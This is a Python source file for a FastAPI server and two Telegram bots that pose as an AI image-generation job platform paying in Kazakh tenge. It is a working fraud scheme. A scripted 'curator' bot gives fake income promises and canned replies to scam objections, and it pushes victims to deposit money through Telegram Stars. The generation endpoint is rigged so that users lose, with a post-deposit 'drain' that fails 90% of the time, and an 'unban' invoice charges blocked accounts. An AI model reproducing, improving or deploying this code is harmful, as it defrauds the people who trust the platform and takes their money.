import os
import asyncio
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import database

# Aiogram setup
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, LabeledPrice, FSInputFile, URLInputFile
from aiogram.exceptions import TelegramAPIError
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

load_dotenv(override=True)

MAIN_BOT_TOKEN = os.getenv("MAIN_BOT_TOKEN", "")
CURATOR_BOT_TOKEN = os.getenv("CURATOR_BOT_TOKEN", "")
CHANNEL_ID = os.getenv("CHANNEL_ID", "@your_channel_username")
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://3e91bacb6d4bdd.lhr.life")

app = FastAPI()
app.mount("/media", StaticFiles(directory=os.path.join(os.path.dirname(__file__), 'media')), name="media")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize bots
main_bot = Bot(token=MAIN_BOT_TOKEN) if MAIN_BOT_TOKEN and MAIN_BOT_TOKEN != "YOUR_MAIN_BOT_TOKEN" else None
curator_bot = Bot(token=CURATOR_BOT_TOKEN) if CURATOR_BOT_TOKEN and CURATOR_BOT_TOKEN != "YOUR_CURATOR_BOT_TOKEN" else None
main_dp = Dispatcher()
curator_dp = Dispatcher()

async def check_subscription(user_id: int):
    if not main_bot or CHANNEL_ID == "@your_channel_username":
        return True
    try:
        member = await main_bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["creator", "administrator", "member"]
    except Exception as e:
        print(f"Error checking sub: {e}")
        return False

class CuratorStates(StatesGroup):
    waiting_for_ready_1 = State()
    waiting_for_ready_2 = State()
    working_on_generations = State()
    instructions_studied = State()
    one_on_one = State()
    waiting_for_balance_feedback = State()
    waiting_for_1on1 = State()
    waiting_for_topup_ready = State()
    waiting_for_topup_questions = State()


@main_dp.message(Command("wipe"))
async def main_wipe_db(message: types.Message):
    admin_ids = {6389268882, 6783355911}
    if message.from_user.id not in admin_ids:
        await message.answer("❌ У вас нет прав для выполнения этой команды.")
        return
        
    # Очищаем базу данных
    import sqlite3
    import os
    try:
        db_path = os.path.join(os.path.dirname(__file__), 'database.sqlite')
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users")
        conn.commit()
        conn.close()
        await message.answer("🧹 База данных пользователей успешно очищена прямо на сервере!")
    except Exception as e:
        await message.answer(f"❌ Ошибка очистки базы: {e}")

@main_dp.message(CommandStart())
async def start_handler(message: types.Message):
    user_id = message.from_user.id
    
    # Handle referral
    args = message.text.split(" ")
    inviter_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            inviter_id = int(args[1].split("_")[1])
        except ValueError:
            pass

    is_subscribed = await check_subscription(user_id)
    
    if not is_subscribed:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подписаться", url=f"https://t.me/{CHANNEL_ID.replace('@', '')}")],
            [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")]
        ])
        await message.answer(f"Для доступа к боту необходимо подписаться на наш канал: {CHANNEL_ID}", reply_markup=keyboard)
        return

    user = database.get_user(user_id)
    if not user:
        user = database.create_user(user_id, 2500)
        # Apply referral bonus if valid inviter
        if inviter_id and inviter_id != user_id:
            inviter = database.get_user(inviter_id)
            if inviter:
                database.apply_referral_bonus(inviter_id, user_id)
                user = database.get_user(user_id) # Reload user data
                
                # Notify inviter
                if main_bot:
                    try:
                        await main_bot.send_message(inviter_id, "🎉 По вашей ссылке зарегистрировался новый пользователь! Вы получили +100 ₸.")
                    except:
                        pass
        text = "Поздравляем! Вы получили бонус 2500 тг."
    else:
        text = "С возвращением!"

    if user["status"] == "scammed":
        await send_invoice(message.chat.id)
        return

    if not user.get("is_approved", False):
        curator_username = "@your_curator_username"
        if curator_bot:
            try:
                me = await curator_bot.get_me()
                curator_username = f"@{me.username}"
            except: pass
        await message.answer(text + f"\n\nДля получения полного доступа к платформе и заказам, пожалуйста, свяжитесь с нашим куратором: {curator_username}")
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить работу", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    await message.answer(text + "\nДоступ открыт. Можете приступать к работе!", reply_markup=keyboard)

@main_dp.callback_query(lambda c: c.data == "check_sub")
async def check_sub_handler(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    is_subscribed = await check_subscription(user_id)
    if not is_subscribed:
        await callback_query.answer("Вы еще не подписались!", show_alert=True)
        return
    
    await callback_query.answer("Подписка подтверждена!")
    
    user = database.get_user(user_id)
    if not user:
        user = database.create_user(user_id, 2500)
        text = "Поздравляем! Вы получили бонус 2500 тг."
    else:
        text = "Доступ открыт!"

    if not user.get("is_approved", False):
        curator_username = "@your_curator_username"
        if curator_bot:
            try:
                me = await curator_bot.get_me()
                curator_username = f"@{me.username}"
            except: pass
        await callback_query.message.answer(text + f"\n\nДля получения полного доступа к платформе и заказам, пожалуйста, свяжитесь с нашим куратором: {curator_username}")
        return

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить работу", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    await callback_query.message.answer(text + "\nДоступ открыт. Можете приступать к работе!", reply_markup=keyboard)

async def send_invoice(chat_id: int):
    if not main_bot: return
    try:
        await main_bot.send_invoice(
            chat_id=chat_id,
            title="Разблокировка аккаунта",
            description="Покупка дополнительных мощностей для восстановления аккаунта",
            payload="unban_account",
            provider_token="", # Required empty for Telegram Stars
            currency="XTR",
            prices=[LabeledPrice(label="Разблокировка", amount=200)] # 200 stars
        )
    except TelegramAPIError as e:
        print(f"Failed to send invoice: {e}")

@main_dp.pre_checkout_query()
async def pre_checkout_query_handler(pre_checkout_query: types.PreCheckoutQuery):
    await main_bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@main_dp.message(lambda message: message.successful_payment is not None)
async def successful_payment_handler(message: types.Message):
    user_id = message.from_user.id
    print(f"Successful payment from {user_id}")
    database.set_status(user_id, "active")
    database.set_balance(user_id, 12500) # Give some balance back
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить работу", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    await message.answer("Оплата прошла успешно! Ваш аккаунт восстановлен. Вы можете продолжать работу.", reply_markup=keyboard)


async def send_ready_2_text(user_id, message_or_bot):
    user = database.get_user(user_id)
    if not user:
        database.create_user(user_id, 2500)
    # Check if we have a message object or bot object to send
    main_bot_username = "@gigastock_bot"
    if main_bot:
        try:
            me = await main_bot.get_me()
            main_bot_username = f"@{me.username}"
        except: pass

    text2 = f"""2 500 тенге уже ждут на вашем балансе. 

Это не просто бонус, на эти деньги вы уже можете сделать генерации и заработать первые деньги 💸

Сделайте 10–15 генераций на мощности 1% и напишите мне. Много времени не нужно - первые генерации занимают до 15 минут.

❗️❗️❗️ Очень важно: Генерации делаем только на 1% мощности - не более 2 500 ₸ за генерацию. Даже если всё получается, выше 1% пока не поднимаемся.

Ссылка на активацию 👉🏼 Открыть приложение (https://t.me/{main_bot_username.replace('@', '')}?start=getdep)"""
    
    try:
        await curator_bot.send_chat_action(user_id, "typing")
        await asyncio.sleep(2)
        await curator_bot.send_message(user_id, text2)
    except:
        pass

async def auto_advance_curator(user_id: int):
    await asyncio.sleep(83)
    # If state is still waiting_for_ready_2, advance it
    state = curator_dp.fsm.resolve_context(curator_bot, user_id, user_id)
    current_state = await state.get_state()
    if current_state == CuratorStates.waiting_for_ready_2.state:
        await state.set_state(CuratorStates.working_on_generations)
        database.update_fsm_state(user_id, 'CuratorStates:working_on_generations')
        await send_ready_2_text(user_id, curator_bot)

@curator_dp.message(CommandStart())
async def curator_start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    text = """Салем 👋 
Тут всё довольно просто. Зарабатываем на генерации изображений через AI, компании покупают такие изображения для бизнеса, рекламы, соцсетей и других проектов.

Без лишней воды и обещаний.
Сейчас объясню суть в видео-пометках ниже, внимательно просмотрите и после этого отпишите: «Готов-а к работе»

Обязательно сначала посмотрите видео пометки, не займет более 1-2 минут."""
    
    await state.set_state(CuratorStates.waiting_for_ready_2)
    database.update_fsm_state(message.from_user.id, 'CuratorStates:waiting_for_ready_2')
    
    await curator_bot.send_chat_action(message.chat.id, "upload_photo")
    await asyncio.sleep(2)
    try:
        media = []
        p1 = os.path.join(os.path.dirname(__file__), 'media', 'hellopic1.png')
        p2 = os.path.join(os.path.dirname(__file__), 'media', 'hellopic2.png')
        p3 = os.path.join(os.path.dirname(__file__), 'media', 'hellopic3.png')
        
        if os.path.exists(p1) and os.path.exists(p2) and os.path.exists(p3):
            media.append(types.InputMediaPhoto(media=FSInputFile(p1), caption=text))
            media.append(types.InputMediaPhoto(media=FSInputFile(p2)))
            media.append(types.InputMediaPhoto(media=FSInputFile(p3)))
            await message.answer_media_group(media)
        else:
            await message.answer(text)
    except Exception as e:
        print("Error sending photos:", e)
        await message.answer(text)
        
    await curator_bot.send_chat_action(message.chat.id, "record_video_note")
    await asyncio.sleep(3)
    try:
        v1 = os.path.join(os.path.dirname(__file__), 'media', 'nado1vid_circle.mp4')
        if os.path.exists(v1):
            await message.answer_video_note(FSInputFile(v1))
    except Exception as e:
        print("Error sending video note:", e)
        
    asyncio.create_task(auto_advance_curator(user_id))

@curator_dp.message(CuratorStates.waiting_for_ready_2)
async def curator_ready_2(message: types.Message, state: FSMContext):
    text_lower = message.text.lower()
    if "готов" in text_lower or "работе" in text_lower or "да" in text_lower:
        await state.set_state(CuratorStates.working_on_generations)
        database.update_fsm_state(message.from_user.id, 'CuratorStates:working_on_generations')
        
        user_id = message.from_user.id
        database.approve_user(user_id, message.from_user.full_name)
        
        await send_ready_2_text(user_id, curator_bot)
    else:
         await message.answer("Пожалуйста, напишите «Готов-а к работе».")

async def send_curator_message(user_id: int):
    if not curator_bot: return
    try:
        text = """Я скоро иду в работу с ребятами 1 на 1. Поэтому хотел у вас уточнить - как у вас идет работа на данный момент?

Есть ко мне какие-нибудь вопросы?"""
        state = curator_dp.fsm.resolve_context(curator_bot, user_id, user_id)
        await state.set_state(CuratorStates.waiting_for_balance_feedback)
        database.update_fsm_state(user_id, 'CuratorStates:waiting_for_balance_feedback')
        await curator_bot.send_message(user_id, text)
    except Exception as e:
        print(f"Error sending curator message: {e}")

async def send_video_sequence(user_id: int):
    if not curator_bot: return
    
    await asyncio.sleep(3)
    await curator_bot.send_chat_action(user_id, "record_video_note")
    await asyncio.sleep(4)
    # Send nado5 (Video Note)
    try:
        p = os.path.join(os.path.dirname(__file__), 'media', 'nado5_circle.mp4')
        await curator_bot.send_video_note(user_id, FSInputFile(p))
    except Exception as e:
        print("Failed to send video note:", e)
        await curator_bot.send_video(user_id, "https://files.catbox.moe/cb348y.mp4")
    
    await asyncio.sleep(60)
    await curator_bot.send_chat_action(user_id, "record_video_note")
    await asyncio.sleep(5)
    
    # Send nado6 (Video Note)
    try:
        p = os.path.join(os.path.dirname(__file__), 'media', 'nado6_circle.mp4')
        await curator_bot.send_video_note(user_id, FSInputFile(p))
    except Exception as e:
        print("Failed to send video note:", e)
        await curator_bot.send_video(user_id, "https://files.catbox.moe/5fow83.mp4")
    
    await asyncio.sleep(60)
    await curator_bot.send_chat_action(user_id, "record_video_note")
    await asyncio.sleep(5)
    
    # Send nado7 (Video Note)
    try:
        p = os.path.join(os.path.dirname(__file__), 'media', 'nado7_circle.mp4')
        await curator_bot.send_video_note(user_id, FSInputFile(p))
    except Exception as e:
        print("Failed to send video note:", e)
        await curator_bot.send_video(user_id, "https://files.catbox.moe/teecco.mp4")
        
    await asyncio.sleep(60)
    await curator_bot.send_chat_action(user_id, "upload_video")
    await asyncio.sleep(5)
    try:
        p = os.path.join(os.path.dirname(__file__), 'media', 'nado7_circle.mp4')
        await curator_bot.send_video_note(user_id, FSInputFile(p))
    except Exception as e:
        print("Failed to send video note:", e)
        await curator_bot.send_video(user_id, "https://files.catbox.moe/7ep6nf.mp4")
        
    await asyncio.sleep(45)
    await curator_bot.send_chat_action(user_id, "record_video_note")
    await asyncio.sleep(5)    
    
    # Send nado8 (Video Note)
    try:
        p = os.path.join(os.path.dirname(__file__), 'media', 'nado8_circle.mp4')
        await curator_bot.send_video_note(user_id, FSInputFile(p))
    except Exception as e:
        print("Failed to send video note:", e)
        await curator_bot.send_video(user_id, "https://files.catbox.moe/7ep6nf.mp4")
        
    await asyncio.sleep(2)
    await curator_bot.send_chat_action(user_id, "typing")
    await asyncio.sleep(2)
        
    text = """Работаю только с небольшими группами до 15 человек - чтобы реально вести людей, а не просто выдавать доступ.

Поздравляю, вы попали в эту группу! Но для того, чтобы в нее попасть и начать работу, вам нужно иметь минимум 10 000 ₸ на балансе платформы.

Мне важен ваш результат, потому что я зарабатываю только когда у вас идут результаты внутри системы.

По результатам обычно картина такая:
— До 50% мощности люди выходят примерно на 300 000–600 000 ₸ за первый месяц
— От 50% мощности результаты у некоторых уже доходят до 1–2 млн ₸

Для старта все заходят именно с 10 000 ₸ - этого обычно хватает чтобы начать, разогнать баланс и дальше двигаться уже с генераций внутри платформы.

Подробно всё показал на видео выше ☝️

Если изучили и готовы начать — напишите:
«1 на 1»"""
    await curator_bot.send_message(user_id, text)
    
    await asyncio.sleep(4)
    await curator_bot.send_chat_action(user_id, "typing")
    await asyncio.sleep(5)
    
    final_text = """Кстати, важный организационный момент. Мощности для генераций мы берем с самой платформы, поэтому рабочий депозит (баланс в приложении) вы контролируете самостоятельно. Я даю стратегию и заказы, а бюджет на работу — полностью ваш инструмент."""
    await curator_bot.send_message(user_id, final_text)
    


@curator_dp.message(CuratorStates.waiting_for_balance_feedback)
async def curator_balance_feedback(message: types.Message, state: FSMContext):
    await state.set_state(CuratorStates.waiting_for_1on1)
    database.update_fsm_state(message.from_user.id, 'CuratorStates:waiting_for_1on1')
    await curator_bot.send_chat_action(message.chat.id, "typing")
    await asyncio.sleep(3)
    text = """Посмотрел ваши генерации.

На самом деле это был очень важный этап - мне нужно было увидеть именно ваш подход, как вы мыслите и как работаете с генерациями без подсказок на этом этапе. Большинство ошибок у новичков появляются не из-за отсутствия способностей, а из-за нескольких мелких деталей, которые человек сам просто не замечает в начале.

И это уже дало мне очень много данных:
я вижу, где у вас сильные стороны, где теряется точность и что нужно поправить, чтобы результаты выросли в разы и без просадок.

Сейчас запишу вам разбор экрана именно где вы допускаете большую ошибку и почему результат не стабильный - покажу ваши генерации и что конкретно нужно изменить.

Посмотрите внимательно и до конца, без перемоток. После этого у вас уже будет совсем другое понимание генераций. 👇🏼"""
    await message.answer(text)
    
    asyncio.create_task(send_video_sequence(message.from_user.id))
    

def match_curator_objection(text: str) -> str:
    t = text.lower()
    
    # 1. Objections to start / refusal / too expensive
    if any(w in t for w in ["не буду", "не хочу", "дорого", "нет денег", "отказываюсь", "передумал", "не интересно", "нах", "отмена", "отвали", "не смогу", "сложно", "не надо", "спасибо", "в другой раз", "позже", "не интересно"]):
        return ("Понимаю ваши сомнения, финансовый вопрос — это всегда серьезно. Но помните: 10 000 ₸ — это не оплата за мое обучение или доступ к системе. "
                "Это ваш собственный рабочий баланс на платформе, который вы будете использовать для генераций и который сможете вывести обратно с прибылью. "
                "Без этого запаса мощности (права на ошибку) запустить генерации не получится, система просто сольет меньшую сумму при первой же просадке. "
                "Если решите попробовать и изменить свой доход — пишите «1 на 1», я на связи.")
                
    # 2. Risk / Scam / Guarantees
    elif any(w in t for w in ["обман", "развод", "кидалово", "скам", "гарант", "честно", "риск", "слив", "проиграю", "потеряю", "лохотрон"]):
        return ("Абсолютно резонный вопрос, в интернете сейчас действительно много обмана. "
                "Но давайте рассуждать логически: ваш рабочий баланс находится полностью под вашим контролем внутри приложения, я к вашему кошельку доступа не имею. "
                "Мой доход напрямую завязан на вашем результате — я получаю 20% комиссии только от вашей ЧИСТОЙ прибыли при выводе средств. "
                "Мне физически невыгодно, чтобы вы теряли деньги. Моя цель — научить вас делать всё правильно. Чтобы начать работу, напишите «1 на 1».")
                
    # 3. Why help? / Curator's cut
    elif any(w in t for w in ["выгода", "зачем помогаешь", "твой интерес", "почему бесплатно", "комиссия", "процент"]):
        return ("Всё честно: я беру 20% комиссии от вашей чистой прибыли, когда вы выводите заработанные деньги с платформы. "
                "Если вы ничего не заработаете — я ничего не получу. Поэтому я лично заинтересован в том, чтобы вы успешно выполняли заказы и "
                "стабильно выходили в плюс. Напишите «1 на 1», чтобы мы начали работу.")
                
    # 4. Telegram Stars / Currency / How to top up
    elif any(w in t for w in ["звезд", "stars", "валюта", "как пополнить", "карта", "оплата", "крипта", "пополнение"]):
        return ("Telegram Stars (Звезды) — это официальная внутренняя валюта Telegram. "
                "Мы используем её, так как платформа полностью интегрирована в мессенджер для вашей безопасности. "
                "Пополнить баланс очень просто: зайдите в Главного бота, нажмите на баланс, выберите пакет на 10 000 ₸ или выше и "
                "оплатите любой банковской картой прямо внутри Telegram. Как будете готовы начать, напишите «1 на 1».")
                
    # 5. What exactly to do / description
    elif any(w in t for w in ["что делать", "как начать", "суть", "что надо делать", "инструкция"]):
        return ("Суть простая: я буду давать вам конкретные заказы на генерацию изображений для бизнеса и рекламы, "
                "а также подсказывать правильные промпты (описания), чтобы нейросеть выдавала идеальный результат с максимальной выплатой. "
                "Для старта напишите мне «1 на 1», и мы разберем первый шаг.")
                
    return None

@curator_dp.message(CuratorStates.waiting_for_1on1)
async def curator_1on1_handler(message: types.Message, state: FSMContext):
    obj_reply = match_curator_objection(message.text)
    if obj_reply:
        await message.answer(obj_reply)
        return
        
    if "1 на 1" in message.text.lower():
        text = """Рад, что вам откликнулась тема 👋

На полноценную работу 1 на 1 мест сейчас нет. Последний месяц у нас очень сильная загруженность по персональной работе, поэтому физически взять всех уже не получается.

Но так как вы только заходите в тему - готов выделить вам немного личного времени и помочь нормально войти в процесс.

Работать будем просто:
вы генерируете по моим инструкциям, получаете результаты и постепенно начинаете понимать логику генераций. Сейчас главное - просто следовать моим инструкциям.

Для старта нужны две вещи:
— старт хотя бы от 7–50% мощности (~10 000 ₸)
— 1–2 часа в день

Этого уже достаточно, чтобы начать разгоняться дальше. И как раз к моменту, когда до вас дойдёт очередь на полноценную работу 1 на 1 - мы уже сделаем вам комфортный баланс для работы с мощностью на 100%.

Как будете готовы - напишите:
«Готов-а начать работу» 👌"""
        await message.answer(text)
        await state.set_state(CuratorStates.waiting_for_topup_ready)
        database.update_fsm_state(message.from_user.id, 'CuratorStates:waiting_for_topup_ready')

@curator_dp.message(CuratorStates.waiting_for_topup_ready)
async def curator_topup_ready_handler(message: types.Message, state: FSMContext):
    obj_reply = match_curator_objection(message.text)
    if obj_reply:
        await message.answer(obj_reply)
        return
        
    if "готов" in message.text.lower() or "начать" in message.text.lower():
        text = """Отлично! 
Но я вижу, что сейчас на вашем балансе недостаточно средств. Почему мы стартуем именно с суммы от 10,000 ₸? 
Если пополнить на меньшую сумму, у вас банально не хватит «права на ошибку». Нейросеть требует запаса мощности. С балансом меньше 10,000 ₸ первая же просадка сожрет ваши деньги, и вы потеряете всё. Поэтому 10,000 ₸ — это минимальная подушка безопасности, чтобы стабильно начать зарабатывать и не слить баланс на первых же генерациях.

Для пополнения:
1. Перейдите в Главного бота и нажмите на ваш баланс.
2. Выберите пакет на 10,000 ₸ или выше.
3. Оплатите через Telegram Stars (Звезды) прямо в Telegram.

Как пополните — напишите мне! Если есть вопросы по пополнению, задавайте."""
        await message.answer(text)
        await state.set_state(CuratorStates.waiting_for_topup_questions)
        database.update_fsm_state(message.from_user.id, 'CuratorStates:waiting_for_topup_questions')

@curator_dp.message(CuratorStates.waiting_for_topup_questions)
async def curator_topup_questions(message: types.Message, state: FSMContext):
    obj_reply = match_curator_objection(message.text)
    if obj_reply:
        await message.answer(obj_reply)
        return
        
    user = database.get_user(message.from_user.id)
    if user and user.get("is_post_topup"):
        await message.answer("Отлично, вижу ваше пополнение! Теперь просто отправляйте мне скриншот каждой вашей генерации, будем разбирать работу вместе.")
    else:
        await message.answer("Если есть трудности с оплатой, не стесняйтесь спрашивать. Оплатить можно любой банковской картой.")

async def curator_final_scam_message(user_id: int):
    if not curator_bot: return
    try:
        text = "Так, вижу, что баланс опять ушел в ноль. Давайте начинать полный разбор полетов. Скидывайте скриншоты последних генераций, посмотрим, где именно вы допустили фатальную ошибку."
        await curator_bot.send_message(user_id, text)
    except:
        pass

# Telegram Stars Pricing
STARS_PRICING = {
    5000: 500,
    7500: 700,
    11500: 1000,
    15000: 1250,
    25000: 2000,
    50000: 3500,
    75000: 5000,
    100000: 6000,
    125000: 7000
}

@main_dp.pre_checkout_query()
async def pre_checkout_handler(pre_checkout_query: types.PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

@main_dp.message(F.successful_payment)
async def successful_payment_handler(message: types.Message):
    payment_info = message.successful_payment
    payload = payment_info.invoice_payload
    if payload.startswith("topup_"):
        try:
            parts = payload.split("_")
            user_id = int(parts[1])
            amount = int(parts[2])
            database.update_balance(user_id, amount)
            database.mark_post_topup(user_id)
            
            # Send success message
            await message.answer(f"🎉 Спасибо за оплату! Ваш баланс успешно пополнен на {amount:,} ₸.")
        except Exception as e:
            print(f"Error processing payment: {e}")

# API Models
class GenerateRequest(BaseModel):
    userId: int
    power: int
    taskId: int

class InvoiceRequest(BaseModel):
    userId: int
    amount: int

@app.post("/api/create_invoice")
async def create_invoice_api(req: InvoiceRequest):
    if req.amount not in STARS_PRICING:
        raise HTTPException(status_code=400, detail="Invalid amount")
    stars = STARS_PRICING[req.amount]
    if not main_bot:
        raise HTTPException(status_code=500, detail="Bot not configured")
        
    prices = [LabeledPrice(label=f"Пополнение {req.amount} ₸", amount=stars)]
    try:
        link = await main_bot.create_invoice_link(
            title="Пополнение баланса",
            description=f"Пакет на {req.amount} ₸",
            payload=f"topup_{req.userId}_{req.amount}",
            provider_token="",
            currency="XTR",
            prices=prices
        )
        return {"invoiceLink": link}
    except Exception as e:
        print(f"Failed to create invoice: {e}")
        raise HTTPException(status_code=500, detail="Failed to create invoice")

@app.get("/api/user/{user_id}")
def get_user_api(user_id: int):
    user = database.get_user(user_id)
    if not user:
        user = database.create_user(user_id, 2500)
    return user

@app.get("/api/profile/{user_id}")
def get_profile_api(user_id: int):
    user = database.get_user(user_id)
    if not user:
        user = database.create_user(user_id, 2500)
    return user

@app.post("/api/generate")
async def generate_api(req: GenerateRequest):
    user = database.get_user(req.userId)
    if not user or user["status"] == "scammed":
        raise HTTPException(status_code=403, detail="Account blocked or not found")
    
    cost = 0
    if req.power == 1: cost = 2500
    elif req.power == 2: cost = 5000
    elif req.power == 3: cost = 7000
    else: cost = 7000 + round((req.power - 3) * 1216.4948)
    
    if user["balance"] < cost:
        asyncio.create_task(send_curator_message(req.userId))
        return {
            "success": False,
            "insufficientFunds": True,
            "message": "Недостаточно средств. Проверьте сообщения от куратора."
        }
    
    generations_total = user.get("generations_total", 0)
    is_third = (generations_total + 1) % 3 == 0

    is_post_topup = user.get("is_post_topup", False)
    is_rigged = user["balance"] >= 20500

    import random
    
    if is_post_topup:
        # Drain logic after top up: fail 90% of time or if balance is getting low
        if random.random() < 0.9 or (user["balance"] < cost and cost <= user["balance"] + 2500):
            profit = -cost
            payout = 0
            success_bool = False
        else:
            profit = random.randint(1995, 3500)
            payout = cost + profit
            success_bool = True
    elif is_rigged or is_third:
        profit = -cost
        payout = 0
        success_bool = False
    else:
        profit = random.randint(1995, 3500)
        payout = cost + profit
        success_bool = True
        
    database.update_balance(req.userId, profit)
    database.record_generation(req.userId, success_bool, profit)
    updated_user = database.get_user(req.userId)
    
    if is_post_topup and not success_bool and updated_user["balance"] < 2500:
        asyncio.create_task(curator_final_scam_message(req.userId))
    elif not is_post_topup and not success_bool and updated_user["balance"] < 2500:
        asyncio.create_task(send_curator_message(req.userId))
    
    return {
        "success": success_bool, 
        "newBalance": updated_user["balance"], 
        "cost": cost,
        "payout": payout,
        "profit": profit
    }



async def daily_new_tasks_notification_loop():
    import random
    import asyncio
    import database
    while True:
        try:
            # Send notification once a day (every 24 hours)
            users = database.get_all_users()
            amount = random.randint(4000, 16000)
            formatted_amount = f"{amount:,}".replace(",", " ")
            text = f"🔥 Отличные новости! Сегодня на платформу было добавлено {formatted_amount} новых рекламных заданий на генерацию изображений! Успейте забрать лучшие заказы! 🚀"
            
            for user in users:
                user_id = user["id"]
                if main_bot:
                    try:
                        await main_bot.send_message(user_id, text)
                    except Exception:
                        pass
        except Exception:
            pass
        await asyncio.sleep(86400) # 24 hours


async def daily_followup_loop():
    import time
    import asyncio
    import database
    while True:
        try:
            users = database.get_all_users()
            now = time.time()
            for user in users:
                user_id = user["id"]
                balance = user["balance"]
                fsm_state = user.get("fsm_state", "")
                last_notified = user.get("last_notified", 0)
                last_action_time = user.get("last_action_time", 0)
                
                if now - last_notified > 86400:
                    
                    if balance == 0 and last_action_time > 0 and (now - last_action_time) > 86400:
                        text = "Привет! Как успехи с генерациями? Вижу, баланс просел — если что-то не получается, дай знать, разберем ошибки."
                        try:
                            await curator_bot.send_message(user_id, text)
                            database.update_last_notified(user_id)
                        except Exception as e:
                            pass
                            
                    elif fsm_state in ["CuratorStates:waiting_for_topup_ready", "CuratorStates:waiting_for_topup_questions"] and (now - last_action_time) > 86400:
                        text = "Привет! Удалось ли подготовить баланс для старта? Если есть сложности с пополнением, пиши — помогу разобраться."
                        try:
                            await curator_bot.send_message(user_id, text)
                            database.update_last_notified(user_id)
                        except Exception as e:
                            pass
                            
        except Exception as e:
            pass
            
        await asyncio.sleep(3600)

@app.on_event("startup")
async def on_startup():
    asyncio.create_task(daily_followup_loop())
    asyncio.create_task(daily_new_tasks_notification_loop())
    print("Starting FastAPI server and Telegram bots...")
    if main_bot:
        asyncio.create_task(main_dp.start_polling(main_bot))
    if curator_bot:
        asyncio.create_task(curator_dp.start_polling(curator_bot))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=3000)
